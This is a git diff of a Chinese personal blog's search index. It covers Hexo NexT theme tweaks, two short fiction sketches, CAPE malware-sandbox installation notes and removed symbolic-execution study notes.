+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">busuanzi_count:</span><br><span class="line">  enable: true  #是否开启不蒜子统计功能</span><br><span class="line">  total_visitors: true #是否统计总访客数</span><br><span class="line">  total_visitors_icon: user #访客数图标为人像</span><br><span class="line">  total_views: true #是否同级总访问数</span><br><span class="line">  total_views_icon: eye #访问数图标为眼睛</span><br><span class="line">  post_views: true #是否统计文章访问数</span><br><span class="line">  post_views_icon: eye #访问数图标为眼睛</span><br></pre></td></tr></table></figure></li>
 </ul>
-<hr>
+<hr />
 <ul>
-<li>链接样式<br>修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
+<li>链接样式
+修改文件 <code>themes\next\source\css\_common\components\post\post.styl</code>，在末尾添加如下css样式：
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.post-body p a&#123;</span><br><span class="line">  color: #0593d3;</span><br><span class="line">  border-bottom: none;</span><br><span class="line">  border-bottom: 1px solid #0593d3;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    color: #6A5ACD;</span><br><span class="line">    border-bottom: none;</span><br><span class="line">    border-bottom: 1px solid #fc6423;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ul>
-<hr>
+<hr />
 <p>参考文章👇</p>
-<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo NexT主题美化总结 | MickeyMiao</a></p>
+<p><a href="https://www.mickeymiao.top/posts/f9b8ceb/">hexo
+NexT主题美化总结 | MickeyMiao</a></p>
 <p>深度美化-放着吃灰</p>
-<p><a href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a><br><a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey 管理你的博客 - 知乎 (zhihu.com)</a></p>
+<p><a
+href="https://blog.csdn.net/maosidiaoxian/article/details/85220394">如何在Hexo中对文章md文件分类_貌似掉线的博客-CSDN博客</a>
+<a href="https://zhuanlan.zhihu.com/p/64965187">使用 Hexo Hey
+管理你的博客 - 知乎 (zhihu.com)</a></p>
 ]]></content>
       <categories>
         <category>Environment</category>
@@ -556,33 +645,76 @@ baby一点都不baby...houseoforange+unsortedbinattack
       </tags>
   </entry>
   <entry>
+    <title>异世界见闻录(1)</title>
+    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+我不想沉在无人问津的海底，只好把登顶作为我的理想
+</blockquote>
+<span id="more"></span>
+<p>  雨尚未停歇。<br />
+  派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br />
+  远处的乌云褪去了夜色，昭示着黎明的到来。<br />
+  “今天还要向上走吗？”我问道。<br />
+  派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br />
+  他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br />
+  苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br />
+  派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br />
+  天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br />
+  “山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br />
+  “不知道。”派斯坦的回答十分简短。<br />
+  话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br />
+  “轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br />
+  突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br />
+  “铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br />
+  那手臂没了动静。<br />
+  我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br />
+  “这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br />
+  ”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br />
+  我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br />
+  雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br />
+  ”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br />
+  我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br />
+  我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br />
+  在意识消散之前，极力向外一瞥——<br />
+  我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。</p>
+]]></content>
+      <categories>
+        <category>sketch</category>
+      </categories>
+  </entry>
+  <entry>
     <title>capeSandbox安装与使用</title>
     <url>/2023/10/02/capeSandbox%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<blockquote class="blockquote-center">
 学习一下cape Sandbox
 </blockquote>
-
 <span id="more"></span>
-<h1 id="0xFF-物理机环境说明"><a href="#0xFF-物理机环境说明" class="headerlink" title="0xFF 物理机环境说明"></a>0xFF 物理机环境说明</h1><p>x64, Windos11, 16G</p>
-<h1 id="0x00-cape-Sandbox环境与安装"><a href="#0x00-cape-Sandbox环境与安装" class="headerlink" title="0x00 cape Sandbox环境与安装"></a>0x00 cape Sandbox环境与安装</h1><ul>
-<li><strong>环境</strong><ul>
+<h1 id="xff-物理机环境说明">0xFF 物理机环境说明</h1>
+<p>x64, Windos11, 16G</p>
+<h1 id="x00-cape-sandbox环境与安装暂时弃用勿看">0x00 cape
+Sandbox环境与安装(暂时弃用，勿看)</h1>
+<ul>
+<li><strong>环境</strong>
+<ul>
 <li>安装Ubuntu20.04，我的VB上有，因此就不再安装了</li>
-<li>启用VT-x/AMD-V，win11默认开启Hyper-V，与VB的VT-x/AMD-V冲突，因此我们直接打开win的cmd<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; cd &quot;Your_Virtualbox_path&quot;</span><br><span class="line"></span><br><span class="line">&gt; VBoxManage.exe list vms</span><br><span class="line">cmd回显: &quot;vm_name&quot; &#123;vm_series&#125;</span><br><span class="line"></span><br><span class="line">&gt; VBoxManage.exe modifyvm &quot;vm_name&quot; --nested-hw-virt on</span><br></pre></td></tr></table></figure></li>
+<li>启用VT-x/AMD-V，win11默认开启Hyper-V，与VB的VT-x/AMD-V冲突，因此我们直接打开win的cmd
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; cd &quot;Your_Virtualbox_path&quot;</span><br><span class="line"></span><br><span class="line">&gt; VBoxManage.exe list vms</span><br><span class="line">cmd回显: &quot;vm_name&quot; &#123;vm_series&#125;</span><br><span class="line"></span><br><span class="line">&gt; VBoxManage.exe modifyvm &quot;vm_name&quot; --nested-hw-virt on</span><br></pre></td></tr></table></figure></li>
 <li>这个时候再打开VirtualBox，就会发现之前变灰的VT-x/AMD-V已经启用了</li>
-<li>进入ubuntu20.04，终端输入<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line"></span><br><span class="line">$ sudo apt install python3 -y</span><br><span class="line"></span><br><span class="line">$ sudo apt install python3-pip -y</span><br><span class="line"></span><br><span class="line">sudo apt install -y git make automake vim</span><br><span class="line"></span><br><span class="line">sudo apt install -y python-dpkt python-jinja2 python-magic python-pymongo python-libvirt python-bottle python-pefile python-chardet swig libssl-dev clamav-daemon python-geoip geoip-database mono-utils</span><br><span class="line"># 这句报错了</span><br><span class="line"></span><br><span class="line">sudo apt install -y mongodb</span><br><span class="line"></span><br><span class="line">sudo apt install -y python python-pip python-setuptools python-virtualenv virtualenv</span><br><span class="line"># 这句报错了</span><br><span class="line"></span><br><span class="line">sudo apt install -y apparmor-utils</span><br><span class="line"></span><br><span class="line">sudo aa-disable /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line"># for users who are not root (in this case, user name is &quot;infected&quot;)</span><br><span class="line">sudo usermod -a -G vboxusers infected</span><br><span class="line"></span><br><span class="line">sudo groupadd pcap</span><br><span class="line"></span><br><span class="line"># in this case, user name is &quot;infected&quot; as well</span><br><span class="line">sudo usermod -a -G pcap infected</span><br><span class="line"></span><br><span class="line">sudo chgrp pcap /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line">sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line">sudo apt install -y virtualbox</span><br><span class="line"></span><br><span class="line">sudo vboxmanage hostonlyif create</span><br><span class="line"></span><br><span class="line">sudo vboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"># 这一步即使用魔法也会出现断连情况，有些不稳定，可以多试几次或者换源，我科学上网第二次就成功了</span><br><span class="line">pip3 install Pillow==8.0.1</span><br><span class="line"></span><br><span class="line"># wget https://raw.githubusercontent.com/doomedraven/Tools/master/Sandbox/cape2.sh按照原教程的这个网址是得不到cape2.sh脚本的，所以我在cape官网直接找到了他们的原脚本</span><br><span class="line">wget https://raw.githubusercontent.com/kevoreilly/CAPEv2/master/installer/cape2.sh</span><br><span class="line"># 但上面这个也失败了，所以我直接浏览器打开上面这个网页，复制全部，然后再ubuntu中用vi粘贴到新脚本上，然后:wq保存退出，再继续下面的内容即可</span><br><span class="line">vi cape2.sh</span><br><span class="line"></span><br><span class="line">$ chmod a+x cape2.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./cape2.sh base cape</span><br><span class="line"></span><br><span class="line">sudo apt install -y mongodb</span><br></pre></td></tr></table></figure></li>
-<li>配置虚拟机<ol>
-<li><a href="https://www.zhihu.com/question/62359057">https://www.zhihu.com/question/62359057</a> 下载windows7任意版本iso</li>
+<li>进入ubuntu20.04，终端输入 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt update</span><br><span class="line"></span><br><span class="line">$ sudo apt install python3 -y</span><br><span class="line"></span><br><span class="line">$ sudo apt install python3-pip -y</span><br><span class="line"></span><br><span class="line">sudo apt install -y git make automake vim</span><br><span class="line"></span><br><span class="line">sudo apt install -y python-dpkt python-jinja2 python-magic python-pymongo python-libvirt python-bottle python-pefile python-chardet swig libssl-dev clamav-daemon python-geoip geoip-database mono-utils</span><br><span class="line"># 这句报错了</span><br><span class="line"></span><br><span class="line">sudo apt install -y mongodb</span><br><span class="line"></span><br><span class="line">sudo apt install -y python python-pip python-setuptools python-virtualenv virtualenv</span><br><span class="line"># 这句报错了</span><br><span class="line"></span><br><span class="line">sudo apt install -y apparmor-utils</span><br><span class="line"></span><br><span class="line">sudo aa-disable /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line"># for users who are not root (in this case, user name is &quot;infected&quot;)</span><br><span class="line">sudo usermod -a -G vboxusers infected</span><br><span class="line"></span><br><span class="line">sudo groupadd pcap</span><br><span class="line"></span><br><span class="line"># in this case, user name is &quot;infected&quot; as well</span><br><span class="line">sudo usermod -a -G pcap infected</span><br><span class="line"></span><br><span class="line">sudo chgrp pcap /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line">sudo setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump</span><br><span class="line"></span><br><span class="line">sudo apt install -y virtualbox</span><br><span class="line"></span><br><span class="line">sudo vboxmanage hostonlyif create</span><br><span class="line"></span><br><span class="line">sudo vboxmanage hostonlyif ipconfig vboxnet0 --ip 192.168.56.1 --netmask 255.255.255.0</span><br><span class="line"></span><br><span class="line"># 这一步即使用魔法也会出现断连情况，有些不稳定，可以多试几次或者换源，我科学上网第二次就成功了</span><br><span class="line">pip3 install Pillow==8.0.1</span><br><span class="line"></span><br><span class="line"># wget https://raw.githubusercontent.com/doomedraven/Tools/master/Sandbox/cape2.sh按照原教程的这个网址是得不到cape2.sh脚本的，所以我在cape官网直接找到了他们的原脚本</span><br><span class="line">wget https://raw.githubusercontent.com/kevoreilly/CAPEv2/master/installer/cape2.sh</span><br><span class="line"># 但上面这个也失败了，所以我直接浏览器打开上面这个网页，复制全部，然后再ubuntu中用vi粘贴到新脚本上，然后:wq保存退出，再继续下面的内容即可</span><br><span class="line">vi cape2.sh</span><br><span class="line"></span><br><span class="line">$ chmod a+x cape2.sh</span><br><span class="line"></span><br><span class="line">$ sudo ./cape2.sh base cape</span><br><span class="line"></span><br><span class="line">sudo apt install -y mongodb</span><br></pre></td></tr></table></figure></li>
+<li>配置虚拟机
+<ol type="1">
+<li>https://www.zhihu.com/question/62359057 下载windows7任意版本iso</li>
 <li>加载到ubuntu2004的VB中</li>
-</ol>
-</li>
+</ol></li>
+</ul></li>
 </ul>
-</li>
-</ul>
-<h1 id="At-Last"><a href="#At-Last" class="headerlink" title="At Last"></a>At Last</h1><ul>
-<li><strong>参考文献</strong><ol>
-<li><a href="https://notes.netbytesec.com/2020/12/cape-sandbox-installation-from-0-to-hero.html">https://notes.netbytesec.com/2020/12/cape-sandbox-installation-from-0-to-hero.html</a></li>
-</ol>
-</li>
+<h1 id="x01-wsl2-virtualbox">0x01 WSL2 + virtualbox</h1>
+<h1 id="at-last">At Last</h1>
+<ul>
+<li><strong>参考文献</strong>
+<ol type="1">
+<li>https://notes.netbytesec.com/2020/12/cape-sandbox-installation-from-0-to-hero.html</li>
+</ol></li>
 </ul>
 ]]></content>
       <categories>
@@ -598,278 +730,25 @@ baby一点都不baby...houseoforange+unsortedbinattack
     <content><![CDATA[<blockquote class="blockquote-center">
 癸卯年八月廿二夜记梦
 </blockquote>
-
 <span id="more"></span>
-<p>这个世界的生物变异速度极快，除了人类。<br>城市中的幢幢钢铁巨兽只剩下断壁残垣，昔日的摩天大楼现在只有七八米高，植物缠绕在灰色的废墟上，颜色各异的藤蔓长满了脓包，里面偶尔喷出令人作呕的瘴气。<br>我被派往公司附近的一栋三四层高的写字楼中清理隐患，同行的还有几位同事，不过我的意识很模糊，已经记不得他们的模样了。<br>天气仍然不好，乌云让本就黑暗的楼道显得更加阴森。<br>幸运的是，上楼期间并没有遇到什么危险，我们马上就看到了此次要清理的”隐患”——我现在只记得那是一个人型生物。<br>拔出手枪，我们靠近那个人型生物。它背对着我们，但身后却像是长了眼睛，在我们向它迈出第一步时，它瞬间以一种奇怪的姿势飞奔上楼。<br>我马上跟了上去，来到了天台——这里本应该是这栋写字楼的四楼。<br>它就站在天台边缘，仍然背对着我。<br>我跟它交流了一段时间，但忘记跟它说了些什么。<br>它跳了下去，在空中爆开，五颜六色的血喷溅在地面的植物上，又很快被蠕动的藤蔓吸收。<br>我感觉意识有些恍惚，便原路返回地面，同事们都不见了，我就顺着来时的路回到公司。<br>路上看见一片绿油油的藤蔓，上面结着橙色的果实，这好像是橘子，但这橘子自己会爆开，然后把种子甩向四周。<br>橘子的种子接触到其他生物以后，迅速吸收了这些生物的生命。我还记得路旁一棵两人合抱的大树在被寄生后迅速掉光了所有叶子，树皮干瘪下去，那上面道道皱纹挤在一起，令人很不舒服。<br>这橘子藤就在公司附近，我躲开几粒爆出的橘子种，迅速回到公司，然后便失去了意识。  </p>
+<p>这个世界的生物变异速度极快，除了人类。<br />
+城市中的幢幢钢铁巨兽只剩下断壁残垣，昔日的摩天大楼现在只有七八米高，植物缠绕在灰色的废墟上，颜色各异的藤蔓长满了脓包，里面偶尔喷出令人作呕的瘴气。<br />
+我被派往公司附近的一栋三四层高的写字楼中清理隐患，同行的还有几位同事，不过我的意识很模糊，已经记不得他们的模样了。<br />
+天气仍然不好，乌云让本就黑暗的楼道显得更加阴森。<br />
+幸运的是，上楼期间并没有遇到什么危险，我们马上就看到了此次要清理的"隐患"——我现在只记得那是一个人型生物。<br />
+拔出手枪，我们靠近那个人型生物。它背对着我们，但身后却像是长了眼睛，在我们向它迈出第一步时，它瞬间以一种奇怪的姿势飞奔上楼。<br />
+我马上跟了上去，来到了天台——这里本应该是这栋写字楼的四楼。<br />
+它就站在天台边缘，仍然背对着我。<br />
+我跟它交流了一段时间，但忘记跟它说了些什么。<br />
+它跳了下去，在空中爆开，五颜六色的血喷溅在地面的植物上，又很快被蠕动的藤蔓吸收。<br />
+我感觉意识有些恍惚，便原路返回地面，同事们都不见了，我就顺着来时的路回到公司。<br />
+路上看见一片绿油油的藤蔓，上面结着橙色的果实，这好像是橘子，但这橘子自己会爆开，然后把种子甩向四周。<br />
+橘子的种子接触到其他生物以后，迅速吸收了这些生物的生命。我还记得路旁一棵两人合抱的大树在被寄生后迅速掉光了所有叶子，树皮干瘪下去，那上面道道皱纹挤在一起，令人很不舒服。<br />
+这橘子藤就在公司附近，我躲开几粒爆出的橘子种，迅速回到公司，然后便失去了意识。</p>
 ]]></content>
       <categories>
         <category>sketch</category>
       </categories>
-  </entry>
-  <entry>
-    <title>异世界见闻录(1)</title>
-    <url>/2023/08/04/%E5%BC%82%E4%B8%96%E7%95%8C%E8%A7%81%E9%97%BB%E5%BD%95(1)/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-我不想沉在无人问津的海底，只好把登顶作为我的理想
-</blockquote>
-
-<span id="more"></span>
-<p>&emsp;&emsp;雨尚未停歇。<br>&emsp;&emsp;派斯坦擦拭着手里白色的长刀，篝火噼啪的声音回响在山洞的深处。这里是海特山峰的林线，连绵不断的小雨让森林蔓延到极高的海拔，也让覆盖着土壤的地面化为泥沼。<br>&emsp;&emsp;远处的乌云褪去了夜色，昭示着黎明的到来。<br>&emsp;&emsp;“今天还要向上走吗？”我问道。<br>&emsp;&emsp;派斯坦收起手中擦拭刀具的布，拿起一根架在篝火旁的粗树枝，上面还串着不明生物的肉，经过火焰的炙烤，让人分不出那黑色究竟是炭还是肉本来的颜色。<br>&emsp;&emsp;他自顾自地吃了起来，并没有回答我的问题。看着派斯坦吃得津津有味，我也拿起一串，轻轻撕下一块放在嘴里。<br>&emsp;&emsp;苦涩瞬间在嘴里爆开。炙烤后的肉几乎没有水分，让咀嚼变得十分困难，而且还散发着令人抗拒的味道，我实在难以吃下第二口，便把肉放回了篝火旁。<br>&emsp;&emsp;派斯坦也不在乎，他只是向外走，将覆盖在洞口的枝条掀开一个小角，侧身站在洞穴边缘，小心翼翼地用眼睛观察外面的情况。稍许，他走了回来，开始收拾自己的包裹。<br>&emsp;&emsp;天还只是蒙蒙亮，厚厚的黑云让光线变得更加黯淡。看到派斯坦要离开，我也开始收拾行囊。<br>&emsp;&emsp;“山顶上究竟有什么东西，这么值得你探寻？”我看着派斯坦将煮开的热水倒进杯中，忍不住开口问道。<br>&emsp;&emsp;“不知道。”派斯坦的回答十分简短。<br>&emsp;&emsp;话音刚落，他带上避水斗笠，用长刀挑开枝条向外走去，我没来得及追问，只能快步跟着他走出洞穴。可刚走到泥土上我就迅速陷了下去，就好像这被雨水浸透的泥土要囫囵将我吞噬。我吃力地将脚拔出，却看到派斯坦也正十分困难地前进，我不禁感到担忧，何时才能到达这直耸入云的山巅？<br>&emsp;&emsp;“轰——”一只紫黑色的手臂扬起一大片泥土，从离我们不远的地底伸了出来。这手臂近一人高，手掌能将我的头颅轻易抓起。恐惧填满了我的大脑，让我迅速向洞口跑去，可粘性极强的土壤死死的吸附住我的双腿，让我难以动弹。<br>&emsp;&emsp;突然，那怪物手掌向派斯坦拍去，巨大的响声在我耳旁炸起，随后是溅起的泥水。一击不成，这手臂又开始蠕动，想要脱离泥沼的吸附，向派斯坦横扫过去。<br>&emsp;&emsp;“铮——”长刀出鞘，白色的刀光迅速劈在紫黑色的手掌上，使得黑色的血管瞬间张开一个狰狞的裂缝，血液与碎肉迸溅在派斯坦的斗笠与披风上，而后被渐大的雨势冲洗干净。<br>&emsp;&emsp;那手臂没了动静。<br>&emsp;&emsp;我长舒一口气，却看到派斯坦切下怪物手臂的一块肌肉，在雨水中洗涤干净后装进包里。不愉快的早餐经历迅速涌上脑海，我感到胃中一阵翻涌。<br>&emsp;&emsp;“这山这么危险，为什么还要坚持爬到山顶啊？”为了转移注意力，我又搬出今早的问题。<br>&emsp;&emsp;”不知道，“派斯坦将目光移向我，”可是山脚已经被不断上涨的岁月之海淹没，我到了半山腰，已经没有下山的余地了。我不想沉在无人问津的海底，只好把登顶作为我的理想。“<br>&emsp;&emsp;我并不清楚山脚的情况，只能糊里糊涂地跟着派斯坦继续前行。这几小时的旅途并无危机，山脉也不陡峭，跟着上升的海拔，我们走到了一片旷野。<br>&emsp;&emsp;雨水让能见度变得非常低，可前方似乎浮现出了白色的雪线，这意味着登顶之旅即将迈入新的阶段，而雪地也会比泥沼要好走一些。<br>&emsp;&emsp;”轰——“紫黑色的手臂擦着我的脸颊从地底冒出，巨大的冲击力把我掀翻在地。我惊慌地看向派斯坦，却发现他的身边也冒出了一只怪物手臂。<br>&emsp;&emsp;我想从地上爬起，可是这次泥沼彻底将我粘在地面，倏地，我身边的那只怪物手臂在我眼前迅速放大，我用尽全身力气将自己的手臂抬起，想要抵挡这比我上半身还宽的手掌，却被深深地拍进泥沼当中。<br>&emsp;&emsp;我听见了骨骼碎裂的声音，随后泥水灌进了我的耳朵。我感受到那怪物手掌正迅速握紧，因为周围的泥土正在不断地挤压我的身体。<br>&emsp;&emsp;在意识消散之前，极力向外一瞥——<br>&emsp;&emsp;我看见飘摇的风雪，看见垂暮的旷野，看见挥舞着长刀的派斯坦，用坚定驱散着孤单。  </p>
-]]></content>
-      <categories>
-        <category>sketch</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>符号执行学习笔记</title>
-    <url>/2023/09/30/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<blockquote class="blockquote-center">
-迈向自动化的第一步——  
-</blockquote>
-
-<span id="more"></span>
-<h1 id="0x00-基本模型"><a href="#0x00-基本模型" class="headerlink" title="0x00  基本模型"></a>0x00  基本模型</h1><ul>
-<li><strong>概述</strong>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure>
-调用$sum(1,2)$，学过C语言的都知道会发生什么事情<br>但如果我调用$sum(a1,a2)$，并且我在这之前并未声明a1，a2呢？<br>先不要用C语言的思路来考虑了，我们称这种情况为<strong>符号执行(Symbolic Execution)</strong>，具体会发生什么我们接着往下看  </li>
-</ul>
-<ul>
-<li><p><strong>基本思想</strong></p>
-<ol>
-<li>使用符号变量代替具体值作为程序或函数的参数，并模拟执行程序中的指令，各指令的操作都基于符号变量进行，其中操作数的值由符号和常量组成的表达式来表示<ol>
-<li>符号变量是什么？<ol>
-<li>读者可以将符号执行视为程序具体执行的自然扩展，符号变量使得程序执行变得不确定，当我们给一系列符号赋一个确定的值时，符号执行就成为了程序具体执行（i.e. 程序的一次具体执行可以视为符号执行的一次实例）</li>
-</ol>
-</li>
-<li>操作数是什么？</li>
-</ol>
-</li>
-<li>对于任意程序，其执行流程是由执行序列的执行语义控制的<ol>
-<li>执行语义：<ol>
-<li>变量定义语句对数据对象的描述 <code>int a;</code></li>
-<li>声明语句对程序数据对象的修改 <code>a = 10;</code></li>
-<li>条件语句对程序执行流程的控制</li>
-</ol>
-</li>
-</ol>
-</li>
-<li>当程序的输入参数确定时，其指令序列被固定，因此程序执行语义和控制流也被固定</li>
-</ol>
-</li>
-<li><p><strong>程序语言定义</strong></p>
-<ol>
-<li>James C. King在提出符号执行技术的同时，也为其限定了理想的适用场景：<ol>
-<li>理想模型中程序只处理“有符号整数”</li>
-<li>程序“执行数”规模有限</li>
-<li>可以处理程序内所有if条件语句的约束表达式</li>
-</ol>
-</li>
-<li>基于符号执行技术的理想场景，对程序语言做如下定义<ol>
-<li>程序变量类型：只包含“有符号整数”</li>
-<li>程序语句类型<ol>
-<li>简单声明语句，如<code>a = 3</code></li>
-<li>if条件语句(包括then 和 else)</li>
-<li>无条件跳转语句，如goto语句</li>
-<li>变量操作语句：如read函数、基本整数运算操作（+、-、*）</li>
-</ol>
-</li>
-<li>程序语义<ol>
-<li>简单声明语句、无条件跳转语句和变量操作语句，只是将程序中的具体值替换为了符号</li>
-<li>而if条件语句中，将具体值替换为了符号，所以我们无法判断if语句中的真值，就不能确定条件分支的走向，这是符号执行技术对程序执行语义的最大改变，也是符号执行与具体执行的关键区别</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-</li>
-<li><p><strong>程序执行状态</strong></p>
-<ul>
-<li>PC<ol>
-<li>为了解决“分支走向不确定”的问题，King为程序状态新添加了一个变量：<strong>路径约束条件 pc(path constraint)</strong>，在每个if条件语句处并没有实际决定程序执行哪个分支，这就需要符号执行引擎<strong>主动选择执行分支</strong>并<strong>记录整个执行过程</strong>，pc就辅助完成了这项工作</li>
-<li>Simply，pc就是符号执行过程中对路径上条件分支走向的选择情况</li>
-<li>来看一段示例<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
-<li>假设上述三个分支中选择了if1:true if2:true if3:false，pc表示为<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>，由此可见，pc是一个bool表达式</li>
-</ol>
-</li>
-<li>符号执行引擎<ul>
-<li>当符号执行到 if(q) 时，pc 有可能包含q（1），也可能包含 ~q（2），如果符号执行引擎选择进入then分支，则 pc 表现为（1）的形式，如果符号执行引擎选择进入else分支， 则 pc 表现为（2）的形式</li>
-<li>而我们希望两条分支都被测试，所以符号执行引擎执行到if条件语句时，符号执行需要创建两个“并行”的执行过程</li>
-<li>每个和符号变量相关的if条件语句都会为pc贡献一个决定程序执行走向的表达式，最后要确定pc对应路径的程序输入参数，只需要用约束求解器对pc进行求解</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p><strong>符号执行树</strong></p>
-<ol>
-<li>定义：用来描述程序执行路径的树形结构</li>
-<li>内容：一个节点对应程序中的一条语句，还可以包含指令计数、PC、变量值等程序执行状态信息(没找到合适的图，就先放一张不带C代码的)<br><img src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" alt=""></li>
-</ol>
-</li>
-<li><p><strong>约束求解</strong>   </p>
-<ol>
-<li>定义：  <ol>
-<li>给定一个三元组<V,D,C>,其中：  <ol>
-<li>V: 变量的有限集合  </li>
-<li>D: 变量的论域，变量可能取值的有限集合  </li>
-<li>C: 有限约束集合，某个约束关系$C_i$包含V中一个或多个变量，若$C_i$包含k个变量，则称其为在这k个变量集合上的k元约束  </li>
-</ol>
-</li>
-<li>约束求解就是找到约束问题的一个解，该解对变量集合中所有变量都赋一个取自其论域的值，并且这些变量的值满足该问题的所有约束条件  </li>
-<li>对于约束问题$P = <V,D,C>$，若P至少存在一个解，则称P为可满足的，否则称其为不可满足的  </li>
-</ol>
-</li>
-<li>分类:  <ol>
-<li>SAT(The Satisfiability problem, 可满足性问题)  <ol>
